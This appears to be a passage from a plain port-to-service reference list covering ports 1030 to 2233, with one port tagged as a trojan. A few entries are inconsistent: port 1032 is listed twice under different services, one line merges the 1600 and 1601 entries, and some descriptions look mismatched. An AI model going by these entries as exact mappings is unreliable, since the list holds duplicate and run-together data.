port 1032 => icq - ICQ 
port 1030 => iad1 - BBN IAD 
port 1031 => iad2 - BBN IAD 
port 1032 => iad3 - BBN IAD 
port 1047 => neod1 - Sun's NEO Object Request Broker 
port 1048 => neod2 - Sun's NEO Object Request Broker 
port 1058 => nim - nim 
port 1059 => nimreg - nimreg 
port 1067 => instl_boots - Installation Bootstrap Proto. Serv.  
port 1068 => instl_bootc - Installation Bootstrap Proto. Cli. 
port 1080 => socks - Socks (or Wingate) 
port 1083 => ansoft-lm-1 - Anasoft License Manager 
port 1084 => ansoft-lm-2 - Anasoft License Manager 
port 1085 => webobjects - Web Objects 
port 1097 => sunclustermgr - Sun Cluster Manager 
port 1098 => rmiactivation - RMI Activation 
port 1099 => rmiregistry - RMI Registry 
port 1110 => nfsd-status - Cluster status info 
port 1111 => lmsocialserver - LM Social Server 
port 1114 => mini-sql - Mini SQL 
port 1123 => murray - Murray 
port 1155 => nfa - Network File Access 
port 1161 => health-polling - Health Polling 
port 1162 => health-trap - Health Trap 
port 1180 => mc-client - Millicent Client Proxy 
port 1188 => hp-webadmin - HP Web Admin 
port 1202 => caiccipc - caiccipc 
port 1212 => lupa - lupa 
port 1222 => nerv - SNI R&D network  
port 1234 => search-agent - Infoseek Search Agent 
port 1239 => nmsd - NMSD 
port 1248 => hermes - hermes 
port 1300 => h323hostcallsc - H323 Host Call Secure 
port 1310 => husky - Husky 
port 1311 => rxmon - RxMon 
port 1312 => sti-envision - STI Envision 
port 1313 => bmc_patroldb - BMC_PATROLDB 
port 1314 => pdps - Photoscript Distributed Printing System 
port 1321 => pip - PIP 
port 1335 => digital-notary - Digital Notary Protocol 
port 1345 => vpjp - VPJP 
port 1346 => alta-ana-lm - Alta Analytics License Manager  
port 1347 => bbn-mmc - multi media conferencing 
port 1348 => bbn-mmx - multi media conferencing 
port 1349 => sbook - Registration Network Protocol  
port 1350 => editbench - Registration Network Protocol  
port 1351 => equationbuilder - Digital Tool Works (MIT)  
port 1352 => lotusnote - Lotus Note 
port 1353 => relief - Relief Consulting 
port 1354 => rightbrain - RightBrain Software 
port 1355 => intuitive-edge - Intuitive Edge  
port 1356 => cuillamartin - CuillaMartin Company  
port 1357 => pegboard - Electronic PegBoard 
port 1358 => connlcli - CONNLCLI 
port 1359 => ftsrv - FTSRV 
port 1360 => mimer - MIMER 
port 1361 => linx - LinX  
port 1362 => timeflies - TimeFlies  
port 1363 => ndm-requester - Network DataMover Requester 
port 1364 => ndm-server - Network DataMover Server  
port 1365 => adapt-sna - Network Software Associates 
port 1366 => netware-csp - Novell NetWare Comm Service Platform 
port 1367 => dcs - DCS 
port 1368 => screencast - ScreenCast 
port 1369 => gv-us - GlobalView to Unix Shell 
port 1370 => us-gv - Unix Shell to GlobalView 
port 1371 => fc-cli - Fujitsu Config Protocol 
port 1372 => fc-ser - Fujitsu Config Protocol 
port 1373 => chromagrafx - Chromagrafx 
port 1374 => molly - EPI Software Systems 
port 1375 => bytex - Bytex 
port 1376 => ibm-pps - IBM Person to Person Software  
port 1377 => cichlid - Cichlid License Manager  
port 1378 => elan - Elan License Manager  
port 1379 => dbreporter - Integrity Solutions 
port 1380 => telesis-licman - Telesis Network License Manager  
port 1381 => apple-licman - Apple Network License Manager  
port 1382 => udt_os - udt_os 
port 1383 => gwha - GW Hannaway Network License Manager 
port 1384 => os-licman - Objective Solutions License Manager  
port 1385 => atex_elmd - Atex Publishing License Manager 
port 1386 => checksum - CheckSum License Manager  
port 1387 => cadsi-lm - Computer Aided Design Software Inc LM  
port 1388 => objective-dbc - Objective Solutions DataBase Cache 
port 1389 => iclpv-dm - Document Manager 
port 1390 => iclpv-sc - Storage Controller  
port 1391 => iclpv-sas - Storage Access Server  
port 1392 => iclpv-pm - Print Manager 
port 1393 => iclpv-nls - Network Log Server  
port 1394 => iclpv-nlc - Network Log Client  
port 1395 => iclpv-wsm - PC Workstation Manager software  
port 1396 => dvl-activemail - DVL Active Mail  
port 1397 => audio-activmail - Audio Active Mail 
port 1398 => video-activmail - Video Active Mail 
port 1399 => cadkey-licman - Cadkey License Manager  
port 1400 => cadkey-tablet - Cadkey Tablet Daemon 
port 1401 => goldleaf-licman - Goldleaf License Manager 
port 1402 => prm-sm-np - Prospero Resource Manager 
port 1403 => prm-nm-np - Prospero Resource Manager 
port 1404 => igi-lm - Infinite Graphics License Manager 
port 1405 => ibm-res - IBM Remote Execution Starter 
port 1406 => netlabs-lm - NetLabs License Manager 
port 1407 => dbsa-lm - DBSA License Manager 
port 1408 => sophia-lm - Sophia License Manager 
port 1409 => here-lm - Here License Manager 
port 1410 => hiq - HiQ License Manager  
port 1411 => af - AudioFile  
port 1412 => innosys - InnoSys  
port 1413 => innosys-acl - Innosys-ACL 
port 1414 => ibm-mqseries - IBM MQSeries  
port 1415 => dbstar - DBStar 
port 1416 => novell-lu6.2 - Novell LU6.2  
port 1417 => timbuktu-srv1 - Timbuktu Service 1 Port  
port 1418 => timbuktu-srv2 - Timbuktu Service 2 Port  
port 1419 => timbuktu-srv3 - Timbuktu Service 3 Port  
port 1420 => timbuktu-srv4 - Timbuktu Service 4 Port  
port 1421 => gandalf-lm - Gandalf License Manager 
port 1422 => autodesk-lm - Autodesk License Manager  
port 1423 => essbase - Essbase Arbor Software  
port 1424 => hybrid - Hybrid Encryption Protocol 
port 1425 => zion-lm - Zion Software License Manager  
port 1426 => sais - Satellite-data Acquisition System 1 
port 1427 => mloadd - mloadd monitoring tool  
port 1428 => informatik-lm - Informatik License Manager 
port 1429 => nms - Hypercom NMS 
port 1430 => tpdu - Hypercom TPDU  
port 1431 => rgtp - Reverse Gossip Transport 
port 1432 => blueberry-lm - Blueberry Software License Manager 
port 1433 => ms-sql-s - Microsoft-SQL-Server  
port 1434 => ms-sql-m - Microsoft-SQL-Monitor 
port 1435 => ibm-cics - IBM CICS 
port 1436 => saism - Satellite-data Acquisition System 2 
port 1437 => tabula - Tabula 
port 1438 => eicon-server - Eicon Security Agent/Server  
port 1439 => eicon-x25 - Eicon X25/SNA Gateway  
port 1440 => eicon-slp - Eicon Service Location Protocol  
port 1441 => cadis-1 - Cadis License Management  
port 1442 => cadis-2 - Cadis License Management  
port 1443 => ies-lm - Integrated Engineering Software  
port 1444 => marcam-lm - MarcamLicense Management 
port 1445 => proxima-lm - Proxima License Manager  
port 1446 => ora-lm - Optical Research Associates License Manager 
port 1447 => apri-lm - Applied Parallel Research LM 
port 1448 => oc-lm - OpenConnect License Manager 
port 1449 => peport - PEport 
port 1450 => dwf - Tandem Distributed Workbench Facility  
port 1451 => infoman - IBM Information Management 
port 1452 => gtegsc-lm - GTE Government Systems License Man  
port 1453 => genie-lm - Genie License Manager 
port 1454 => interhdl_elmd - interHDL License Manager 
port 1455 => esl-lm - ESL License Manager 
port 1456 => dca - DCA 
port 1457 => valisys-lm - Valisys License Manager 
port 1458 => nrcabq-lm - Nichols Research Corp. 
port 1459 => proshare1 - Proshare Notebook Application 
port 1460 => proshare2 - Proshare Notebook Application 
port 1461 => ibm_wrless_lan - IBM Wireless LAN  
port 1462 => world-lm - World License Manager 
port 1463 => nucleus - Nucleus 
port 1464 => msl_lmd - MSL License Manager 
port 1465 => pipes - Pipes Platform  
port 1466 => oceansoft-lm - Ocean Software License Manager 
port 1467 => csdmbase - CSDMBASE 
port 1468 => csdm - CSDM 
port 1469 => aal-lm - Active Analysis Limited License Manager 
port 1470 => uaiact - Universal Analytics 
port 1471 => csdmbase - csdmbase  
port 1472 => csdm - csdm  
port 1473 => openmath - OpenMath  
port 1474 => telefinder - Telefinder  
port 1475 => taligent-lm - Taligent License Manager 
port 1476 => clvm-cfg - clvm-cfg 
port 1477 => ms-sna-server - ms-sna-server 
port 1478 => ms-sna-base - ms-sna-base 
port 1479 => dberegister - dberegister 
port 1480 => pacerforum - PacerForum 
port 1481 => airs - AIRS 
port 1482 => miteksys-lm - Miteksys License Manager 
port 1483 => afs - AFS License Manager  
port 1484 => confluent - Confluent License Manager  
port 1485 => lansource - LANSource  
port 1486 => nms_topo_serv - nms_topo_serv 
port 1487 => localinfosrvr - LocalInfoSrvr 
port 1488 => docstor - DocStor 
port 1489 => dmdocbroker - dmdocbroker 
port 1490 => insitu-conf - insitu-conf 
port 1491 => anynetgateway - anynetgateway 
port 1492 => stone-design-1 - stone-design-1 
port 1493 => netmap_lm - netmap_lm 
port 1494 => ica - ica  
port 1495 => cvc - cvc 
port 1496 => liberty-lm - liberty-lm 
port 1497 => rfx-lm - rfx-lm 
port 1498 => sybase-sqlany - Sybase SQL Any 
port 1499 => fhc - Federico Heinz Consultora 
port 1500 => vlsi-lm - VLSI License Manager 
port 1501 => saiscm - Satellite-data Acquisition System 3  
port 1502 => shivadiscovery - Shiva 
port 1503 => imtc-mcs - Databeam 
port 1504 => evb-elm - EVB Software Engineering License Manager 
port 1505 => funkproxy - Funk Software, Inc. 
port 1506 => utcd - Universal Time daemon (utcd) 
port 1507 => symplex - symplex 
port 1508 => diagmond - diagmond 
port 1509 => robcad-lm - Robcad, Ltd. License Manager 
port 1510 => mvx-lm - Midland Valley Exploration Ltd. Lic. Man. 
port 1511 => 3l-l1 - 3l-l1 
port 1512 => wins - Microsoft's Windows Internet Name Service 
port 1513 => fujitsu-dtc - Fujitsu Systems Business of America, Inc 
port 1514 => fujitsu-dtcns - Fujitsu Systems Business of America, Inc 
port 1515 => ifor-protocol - ifor-protocol 
port 1516 => vpad - Virtual Places Audio data 
port 1517 => vpac - Virtual Places Audio control 
port 1518 => vpvd - Virtual Places Video data 
port 1519 => vpvc - Virtual Places Video control 
port 1520 => atm-zip-office - atm zip office 
port 1521 => ncube-lm - nCube License Manager 
port 1522 => ricardo-lm - Ricardo North America License Manager 
port 1523 => cichild-lm - cichild 
port 1524 => ingreslock - ingres 
port 1525 => orasrv - oracle 
port 1525 => prospero-np - Prospero Directory Service non-priv 
port 1526 => pdap-np - Prospero Data Access Prot non-priv  
port 1527 => tlisrv - oracle 
port 1528 => mciautoreg - micautoreg 
port 1529 => coauthor - oracle 
port 1530 => rap-service - rap-service 
port 1531 => rap-listen - rap-listen 
port 1532 => miroconnect - miroconnect 
port 1533 => virtual-places - Virtual Places Software 
port 1534 => micromuse-lm - micromuse-lm 
port 1535 => ampr-info - ampr-info 
port 1536 => ampr-inter - ampr-inter 
port 1537 => sdsc-lm - isi-lm 
port 1538 => 3ds-lm - 3ds-lm 
port 1539 => intellistor-lm - Intellistor License Manager 
port 1540 => rds - rds 
port 1541 => rds2 - rds2 
port 1542 => gridgen-elmd - gridgen-elmd 
port 1543 => simba-cs - simba-cs 
port 1544 => aspeclmd - aspeclmd 
port 1545 => vistium-share - vistium-share 
port 1546 => abbaccuray - abbaccuray 
port 1547 => laplink - laplink 
port 1548 => axon-lm - Axon License Manager 
port 1549 => shivahose - Shiva Hose 
port 1550 => 3m-image-lm - Image Storage license manager 3M Company 
port 1551 => hecmtl-db - HECMTL-DB 
port 1552 => pciarray - pciarray 
port 1553 => sna-cs - sna-cs 
port 1554 => caci-lm - CACI Products Company License Manager 
port 1555 => livelan - livelan 
port 1556 => ashwin - AshWin CI Tecnologies 
port 1557 => arbortext-lm - ArborText License Manager 
port 1558 => xingmpeg - xingmpeg 
port 1559 => web2host - web2host 
port 1560 => asci-val - asci-val 
port 1561 => facilityview - facilityview 
port 1562 => pconnectmgr - pconnectmgr 
port 1563 => cadabra-lm - Cadabra License Manager 
port 1564 => pay-per-view - Pay-Per-View 
port 1565 => winddlb - WinDD 
port 1566 => corelvideo - CORELVIDEO 
port 1567 => jlicelmd - jlicelmd 
port 1568 => tsspmap - tsspmap 
port 1569 => ets - ets 
port 1570 => orbixd - orbixd 
port 1571 => rdb-dbs-disp - Oracle Remote Data Base 
port 1572 => chip-lm - Chipcom License Manager 
port 1573 => itscomm-ns - itscomm-ns 
port 1574 => mvel-lm - mvel-lm 
port 1575 => oraclenames - oraclenames 
port 1576 => moldflow-lm - moldflow-lm 
port 1577 => hypercube-lm - hypercube-lm 
port 1578 => jacobus-lm - Jacobus License Manager 
port 1579 => ioc-sea-lm - ioc-sea-lm 
port 1580 => tn-tl-r1 - tn-tl-r1 
port 1581 => mil-2045-47001 - MIL-2045-47001 
port 1582 => msims - MSIMS 
port 1583 => simbaexpress - simbaexpress 
port 1584 => tn-tl-fd2 - tn-tl-fd2 
port 1585 => intv - intv 
port 1586 => ibm-abtact - ibm-abtact 
port 1587 => pra_elmd - pra_elmd 
port 1588 => triquest-lm - triquest-lm  
port 1589 => vqp - VQP 
port 1590 => gemini-lm - gemini-lm 
port 1591 => ncpm-pm - ncpm-pm 
port 1592 => commonspace - commonspace 
port 1593 => mainsoft-lm - mainsoft-lm 
port 1594 => sixtrak - sixtrak 
port 1595 => radio - radio 
port 1596 => radio-sm - radio-sm 
port 1597 => orbplus-iiop - orbplus-iiop 
port 1598 => picknfs - picknfs 
port 1599 => simbaservices - simbaservices 
port 1600 => issd - 1600/udp => issd - 1601/tcp => aas - aas 
port 1602 => inspect - inspect 
port 1603 => picodbc - pickodbc 
port 1604 => icabrowser - icabrowser 
port 1605 => slp - Salutation Manager (Salutation Protocol) 
port 1606 => slm-api - Salutation Manager (SLM-API) 
port 1607 => stt - stt 
port 1608 => smart-lm - Smart Corp. License Manager 
port 1609 => isysg-lm - isysg-lm 
port 1610 => taurus-wh - taurus-wh 
port 1611 => ill - Inter Library Loan 
port 1612 => netbill-trans - NetBill Transaction Server 
port 1613 => netbill-keyrep - NetBill Key Repository 
port 1614 => netbill-cred - NetBill Credential Server 
port 1615 => netbill-auth - NetBill Authorization Server 
port 1616 => netbill-prod - NetBill Product Server 
port 1617 => nimrod-agent - Nimrod Inter-Agent Communication 
port 1618 => skytelnet - skytelnet 
port 1619 => xs-openstorage - xs-openstorage 
port 1620 => faxportwinport - faxportwinport 
port 1621 => softdataphone - softdataphone 
port 1622 => ontime - ontime 
port 1623 => jaleosnd - jaleosnd 
port 1624 => udp-sr-port - udp-sr-port 
port 1625 => svs-omagent - svs-omagent 
port 1626 => shockwave - Shockwave 
port 1627 => t128-gateway - T.128 Gateway 
port 1628 => lontalk-norm - LonTalk normal 
port 1629 => lontalk-urgnt - LonTalk urgent 
port 1630 => oraclenet8cman - Oracle Net8 Cman 
port 1631 => visitview - Visit view 	 
port 1632 => pammratc - PAMMRATC 
port 1633 => pammrpc - PAMMRPC 
port 1634 => loaprobe - Log On America Probe 
port 1635 => edb-server1 - EDB Server 1 
port 1636 => cncp - CableNet Control Protocol 
port 1637 => cnap - CableNet Admin Protocol 
port 1638 => cnip - CableNet Info Protocol 
port 1639 => cert-initiator - cert-initiator 
port 1640 => cert-responder - cert-responder 
port 1641 => invision - InVision 
port 1642 => isis-am - isis-am 
port 1643 => isis-ambc - isis-ambc 
port 1644 => saiseh - Satellite-data Acquisition System 4 
port 1645 => datametrics - datametrics 
port 1646 => sa-msg-port - sa-msg-port 
port 1647 => rsap - rsap 
port 1648 => concurrent-lm - concurrent-lm 
port 1649 => kermit - kermit 
port 1650 => nkd - nkd 
port 1651 => shiva_confsrvr - shiva_confsrvr 
port 1652 => xnmp - xnmp 
port 1653 => alphatech-lm - alphatech-lm 
port 1654 => stargatealerts - stargatealerts 
port 1655 => dec-mbadmin - dec-mbadmin 
port 1656 => dec-mbadmin-h - dec-mbadmin-h 
port 1657 => fujitsu-mmpdc - fujitsu-mmpdc 
port 1658 => sixnetudr - sixnetudr 
port 1659 => sg-lm - Silicon Grail License Manager 
port 1660 => skip-mc-gikreq - skip-mc-gikreq 
port 1661 => netview-aix-1 - netview-aix-1 
port 1662 => netview-aix-2 - netview-aix-2 
port 1663 => netview-aix-3 - netview-aix-3 
port 1664 => netview-aix-4 - netview-aix-4 
port 1665 => netview-aix-5 - netview-aix-5 
port 1666 => netview-aix-6 - netview-aix-6 
port 1667 => netview-aix-7 - netview-aix-7 
port 1668 => netview-aix-8 - netview-aix-8 
port 1669 => netview-aix-9 - netview-aix-9 
port 1670 => netview-aix-10 - netview-aix-10 
port 1671 => netview-aix-11 - netview-aix-11 
port 1672 => netview-aix-12 - netview-aix-12 
port 1673 => proshare-mc-1 - Intel Proshare Multicast 
port 1674 => proshare-mc-2 - Intel Proshare Multicast 
port 1675 => pdp - Pacific Data Products 
port 1676 => netcomm1 - netcomm1 
port 1677 => groupwise - groupwise 
port 1678 => prolink - prolink 
port 1679 => darcorp-lm - darcorp-lm 
port 1680 => microcom-sbp - microcom-sbp	 
port 1681 => sd-elmd - sd-elmd 
port 1682 => lanyon-lantern - lanyon-lantern 
port 1683 => ncpm-hip - ncpm-hip 
port 1684 => snaresecure - SnareSecure 
port 1685 => n2nremote - n2nremote 
port 1686 => cvmon - cvmon 
port 1687 => nsjtp-ctrl - nsjtp-ctrl 
port 1688 => nsjtp-data - nsjtp-data 
port 1689 => firefox - firefox 
port 1690 => ng-umds - ng-umds 
port 1691 => empire-empuma - empire-empuma 
port 1692 => sstsys-lm - sstsys-lm 
port 1693 => rrirtr - rrirtr 
port 1694 => rrimwm - rrimwm 
port 1695 => rrilwm - rrilwm 
port 1696 => rrifmm - rrifmm 
port 1697 => rrisat - rrisat 
port 1698 => rsvp-encap-1 - RSVP-ENCAPSULATION-1 
port 1699 => rsvp-encap-2 - RSVP-ENCAPSULATION-2 
port 1700 => mps-raft - mps-raft 
port 1701 => l2f - l2f 
port 1701 => l2tp - l2tp 
port 1702 => deskshare - deskshare 
port 1703 => hb-engine - hb-engine 
port 1704 => bcs-broker - bcs-broker 
port 1705 => slingshot - slingshot 
port 1706 => jetform - jetform 
port 1707 => vdmplay - vdmplay 
port 1708 => gat-lmd - gat-lmd 
port 1709 => centra - centra 
port 1710 => impera - impera 
port 1711 => pptconference - pptconference 
port 1712 => registrar - resource monitoring service 
port 1713 => conferencetalk - ConferenceTalk 
port 1714 => sesi-lm - sesi-lm 
port 1715 => houdini-lm - houdini-lm 
port 1716 => xmsg - xmsg 
port 1717 => fj-hdnet - fj-hdnet 
port 1718 => h323gatedisc - h323gatedisc 
port 1719 => h323gatestat - h323gatestat  
port 1720 => h323hostcall - h323hostcall 
port 1721 => caicci - caicci 
port 1722 => hks-lm - HKS License Manager 
port 1723 => pptp - pptp 
port 1724 => csbphonemaster - csbphonemaster 
port 1725 => iden-ralp - iden-ralp 
port 1726 => iberiagames - IBERIAGAMES 
port 1727 => winddx - winddx 
port 1728 => telindus - TELINDUS 
port 1729 => citynl - CityNL License Management 
port 1730 => roketz - roketz 
port 1731 => msiccp - MSICCP 
port 1732 => proxim - proxim 
port 1733 => siipat - SIMS - SIIPAT Protocol for Alarm Transmission 
port 1734 => cambertx-lm - Camber Corporation License Management 
port 1735 => privatechat - PrivateChat 
port 1736 => street-stream - street-stream 
port 1737 => ultimad - ultimad 
port 1738 => gamegen1 - GameGen1 
port 1739 => webaccess - webaccess 
port 1740 => encore - encore 
port 1741 => cisco-net-mgmt - cisco-net-mgmt 
port 1742 => 3Com-nsd - 3Com-nsd 
port 1743 => cinegrfx-lm - Cinema Graphics License Manager 
port 1744 => ncpm-ft - ncpm-ft 
port 1745 => remote-winsock - remote-winsock 
port 1746 => ftrapid-1 - ftrapid-1 
port 1747 => ftrapid-2 - ftrapid-2 
port 1748 => oracle-em1 - oracle-em1 
port 1749 => aspen-services - aspen-services 
port 1750 => sslp - Simple Socket Library's PortMaster 
port 1751 => swiftnet - SwiftNet 
port 1752 => lofr-lm - Leap of Faith Research License Manager  
port 1753 => translogic-lm - Translogic License Manager 
port 1754 => oracle-em2 - oracle-em2 
port 1755 => ms-streaming - ms-streaming 
port 1756 => capfast-lmd - capfast-lmd 
port 1757 => cnhrp - cnhrp 
port 1758 => tftp-mcast - tftp-mcast 
port 1759 => spss-lm - SPSS License Manager 
port 1760 => www-ldap-gw - www-ldap-gw 
port 1761 => cft-0 - cft-0 
port 1762 => cft-1 - cft-1 
port 1763 => cft-2 - cft-2 
port 1764 => cft-3 - cft-3 
port 1765 => cft-4 - cft-4 
port 1766 => cft-5 - cft-5 
port 1767 => cft-6 - cft-6 
port 1768 => cft-7 - cft-7 
port 1769 => bmc-net-adm - bmc-net-adm 
port 1770 => bmc-net-svc - bmc-net-svc 
port 1771 => vaultbase - vaultbase 
port 1772 => essweb-gw - EssWeb Gateway 
port 1773 => kmscontrol - KMSControl 
port 1774 => global-dtserv - global-dtserv 
port 1776 => femis - Federal Emergency Management Information System 
port 1777 => powerguardian - powerguardian 
port 1778 => prodigy-intrnet - prodigy-internet 
port 1779 => pharmasoft - pharmasoft 
port 1780 => dpkeyserv - dpkeyserv 
port 1781 => answersoft-lm - answersoft-lm 
port 1782 => hp-hcip - hp-hcip 
port 1783 => fjris - Fujitsu Remote Install Service 
port 1784 => finle-lm - Finle License Manager 
port 1785 => windlm - Wind River Systems License Manager 
port 1786 => funk-logger - funk-logger 
port 1787 => funk-license - funk-license 
port 1788 => psmond - psmond 
port 1789 => hello - hello 
port 1790 => nmsp - Narrative Media Streaming Protocol 
port 1791 => ea1 - EA1 
port 1792 => ibm-dt-2 - ibm-dt-2 
port 1793 => rsc-robot - rsc-robot 
port 1794 => cera-bcm - cera-bcm 
port 1795 => dpi-proxy - dpi-proxy 
port 1796 => vocaltec-admin - Vocaltec Server Administration 
port 1797 => uma - UMA  
port 1798 => etp - Event Transfer Protocol 
port 1799 => netrisk - NETRISK 
port 1800 => ansys-lm - ANSYS-License manager 
port 1801 => msmq - Microsoft Message Que 
port 1802 => concomp1 - ConComp1 
port 1803 => hp-hcip-gwy - HP-HCIP-GWY 
port 1804 => enl - ENL 
port 1805 => enl-name - ENL-Name 
port 1806 => musiconline - Musiconline 
port 1807 => fhsp - Fujitsu Hot Standby Protocol 
port 1808 => oracle-vp2 - Oracle-VP2 
port 1809 => oracle-vp1 - Oracle-VP1 
port 1810 => jerand-lm - Jerand License Manager 
port 1811 => scientia-sdb - Scientia-SDB 
port 1812 => radius - RADIUS 
port 1813 => radius-acct - RADIUS Accounting 
port 1814 => tdp-suite - TDP Suite 
port 1815 => mmpft - MMPFT 
port 1816 => harp - HARP 
port 1817 => rkb-oscs - RKB-OSCS 
port 1818 => etftp - Enhanced Trivial File Transfer Protocol 
port 1819 => plato-lm - Plato License Manager 
port 1820 => mcagent - mcagent 
port 1821 => donnyworld - donnyworld 
port 1822 => es-elmd - es-elmd 
port 1823 => unisys-lm - Unisys Natural Language License Manager 
port 1824 => metrics-pas - metrics-pas 
port 1825 => direcpc-video - DirecPC Video 
port 1826 => ardt - ARDT 
port 1827 => asi - ASI  
port 1828 => itm-mcell-u - itm-mcell-u 
port 1829 => optika-emedia - Optika eMedia  
port 1830 => net8-cman - Oracle Net8 CMan Admin 
port 1831 => myrtle - Myrtle 
port 1832 => tht-treasure - ThoughtTreasure 
port 1833 => udpradio - udpradio 
port 1834 => ardusuni - ARDUS Unicast 
port 1835 => ardusmul - ARDUS Multicast 
port 1836 => ste-smsc - ste-smsc 
port 1837 => csoft1 - csoft1 
port 1838 => talnet - TALNET 
port 1839 => netopia-vo1 - netopia-vo1 
port 1840 => netopia-vo2 - netopia-vo2 
port 1841 => netopia-vo3 - netopia-vo3 
port 1842 => netopia-vo4 - netopia-vo4 
port 1843 => netopia-vo5 - netopia-vo5 
port 1844 => direcpc-dll - DirecPC-DLL 
port 1850 => gsi - GSI 
port 1851 => ctcd - ctcd 
port 1860 => sunscalar-svc - SunSCALAR Services 
port 1861 => lecroy-vicp - LeCroy VICP 
port 1862 => techra-server - techra-server 
port 1863 => msnp - MSNP 
port 1864 => paradym-31port - Paradym 31 Port 
port 1865 => entp - ENTP 
port 1870 => sunscalar-dns - SunSCALAR DNS Service 
port 1871 => canocentral0 - Cano Central 0 
port 1872 => canocentral1 - Cano Central 1 
port 1873 => fjmpjps - Fjmpjps 
port 1874 => fjswapsnp - Fjswapsnp 
port 1881 => ibm-mqseries2 - IBM MQSeries 
port 1895 => vista-4gl - Vista 4GL 
port 1899 => mc2studios - MC2Studios 
port 1901 => fjicl-tep-a - Fujitsu ICL Terminal Emulator Program A 
port 1902 => fjicl-tep-b - Fujitsu ICL Terminal Emulator Program B 
port 1903 => linkname - Local Link Name Resolution 
port 1904 => fjicl-tep-c - Fujitsu ICL Terminal Emulator Program C 
port 1905 => sugp - Secure UP.Link Gateway Protocol 
port 1906 => tpmd - TPortMapperReq 
port 1907 => intrastar - IntraSTAR 
port 1908 => dawn - Dawn 
port 1909 => global-wlink - Global World Link 
port 1910 => ultrabac - ultrabac 
port 1911 => mtp - Starlight Networks Multimedia Transport Protocol 
port 1912 => rhp-iibp - rhp-iibp	 
port 1913 => armadp - armadp 
port 1914 => elm-momentum - Elm-Momentum 
port 1915 => facelink - FACELINK 
port 1916 => persona - Persoft Persona 
port 1917 => noagent - nOAgent 
port 1918 => can-nds - Candle Directory Service - NDS 
port 1919 => can-dch - Candle Directory Service - DCH 
port 1920 => can-ferret - Candle Directory Service - FERRET 
port 1921 => noadmin - NoAdmin 
port 1922 => tapestry - Tapestry	 
port 1923 => spice - SPICE 
port 1924 => xiip - XIIP 
port 1944 => close-combat - close-combat 
port 1945 => dialogic-elmd - dialogic-elmd 
port 1946 => tekpls - tekpls 
port 1947 => hlserver - hlserver 
port 1948 => eye2eye - eye2eye 
port 1949 => ismaeasdaqlive - ISMA Easdaq Live 
port 1950 => ismaeasdaqtest - ISMA Easdaq Test 
port 1951 => bcs-lmserver - bcs-lmserver 
port 1952 => mpnjsc - mpnjsc 
port 1953 => rapidbase - Rapid Base 
port 1964 => solid-e-engine - SOLID E ENGINE 
port 1965 => tivoli-npm - Tivoli NPM 
port 1966 => slush - Slush 
port 1967 => sns-quote - SNS Quote 
port 1972 => intersys-cache - Cache 
port 1973 => dlsrap - Data Link Switching Remote Access Protocol 
port 1975 => tcoflashagent - TCO Flash Agent 
port 1976 => tcoregagent - TCO Reg Agent  
port 1977 => tcoaddressbook - TCO Address Book 
port 1981 => shockrave - Shockrave TROJAN 
port 1984 => bb - BB 
port 1985 => hsrp - Hot Standby Router Protocol 
port 1986 => licensedaemon - cisco license management 
port 1987 => tr-rsrb-p1 - cisco RSRB Priority 1 port 
port 1988 => tr-rsrb-p2 - cisco RSRB Priority 2 port 
port 1989 => tr-rsrb-p3 - cisco RSRB Priority 3 port (or mshnet - MHSnet System) 
port 1990 => stun-p1 - cisco STUN Priority 1 port 
port 1991 => stun-p2 - cisco STUN Priority 2 port 
port 1992 => stun-p3 - cisco STUN Priority 3 port (or IPsendmsg) 
port 1993 => snmp-tcp-port - cisco SNMP TCP port 
port 1994 => stun-port - cisco serial tunnel port 
port 1995 => perf-port - cisco perf port 
port 1996 => tr-rsrb-port - cisco Remote SRB port 
port 1997 => gdp-port - cisco Gateway Discovery Protocol 
port 1998 => x25-svc-port - cisco X.25 service (XOT) 
port 1999 => tcp-id-port - cisco identification port 
port 2000 => callbook - callbook 
port 2001 => dc - dc 
port 2002 => globe - globe 
port 2004 => mailbox - mailbox 
port 2005 => berknet - berknet 
port 2006 => invokator - invokator 
port 2007 => dectalk - dectalk 
port 2008 => conf - conf 
port 2009 => news - news 
port 2010 => search - search 
port 2011 => raid-cc - raid 
port 2012 => ttyinfo - ttyinfo 
port 2013 => raid-am - raid-am 
port 2014 => troff - troff 
port 2015 => cypress - cypress 
port 2016 => bootserver - bootserver 
port 2017 => cypress-stat - cypress-stat 
port 2018 => terminaldb - terminaldb 
port 2019 => whosockami - whosockami 
port 2020 => xinupageserver - xinupageserver 
port 2021 => servexec - servexec 
port 2022 => down - down 
port 2023 => xinuexpansion3 - xinuexpansion3 
port 2024 => xinuexpansion4 - xinuexpansion4 
port 2025 => ellpack - ellpack 
port 2026 => scrabble - scrabble 
port 2027 => shadowserver - shadowserver 
port 2028 => submitserver - submitserver 
port 2030 => device2 - device2 
port 2032 => blackboard - blackboard 
port 2033 => glogger - glogger 
port 2034 => scoremgr - scoremgr 
port 2035 => imsldoc - imsldoc 
port 2038 => objectmanager - objectmanager 
port 2040 => lam - lam 
port 2041 => interbase - interbase 
port 2042 => isis - isis 
port 2043 => isis-bcast - isis-bcast 
port 2044 => rimsl - rimsl 
port 2045 => cdfunc - cdfunc 
port 2046 => sdfunc - sdfunc 
port 2047 => dls - dls 
port 2048 => dls-monitor - dls-monitor 
port 2049 => nfs - Network File System (or Sun Microsystems or shilp) 
port 2065 => dlsrpn - Data Link Switch Read Port Number 
port 2067 => dlswpn - Data Link Switch Write Port Number 
port 2090 => lrp - Load Report Protocol 
port 2091 => prp - PRP 
port 2092 => descent3 - Descent 3 
port 2093 => nbx-cc - NBX CC 
port 2094 => nbx-au - NBX AU 
port 2095 => nbx-ser - NBX SER 
port 2096 => nbx-dir - NBX DIR 
port 2097 => jetformpreview - Jet Form Preview 
port 2098 => dialog-port - Dialog Port 
port 2099 => h2250-annex-g - H.225.0 Annex G 
port 2100 => amiganetfs - amiganetfs 
port 2101 => rtcm-sc104 - rtcm-sc104 
port 2102 => zephyr-srv - Zephyr server 
port 2103 => zephyr-clt - Zephyr serv-hm connection 
port 2104 => zephyr-hm - Zephyr hostmanager 
port 2105 => minipay - MiniPay 
port 2106 => mzap - MZAP 
port 2107 => bintec-admin - BinTec Admin  
port 2108 => comcam - Comcam 
port 2109 => ergolight - Ergolight 
port 2180 => mc-gt-srv - Millicent Vendor Gateway Server 
port 2200 => ici - ICI 
port 2201 => ats - Advanced Training System Program 
port 2202 => imtc-map - Int. Multimedia Teleconferencing Cosortium 
port 2213 => kali - Kali 
port 2220 => ganymede - Ganymede 
port 2221 => rockwell-csp1 - Rockwell CSP1 
port 2222 => rockwell-csp2 - Rockwell CSP2 
port 2223 => rockwell-csp3 - Rockwell CSP3 
port 2232 => ivs-video - IVS Video default 
port 2233 => infocrypt - INFOCRYPT 
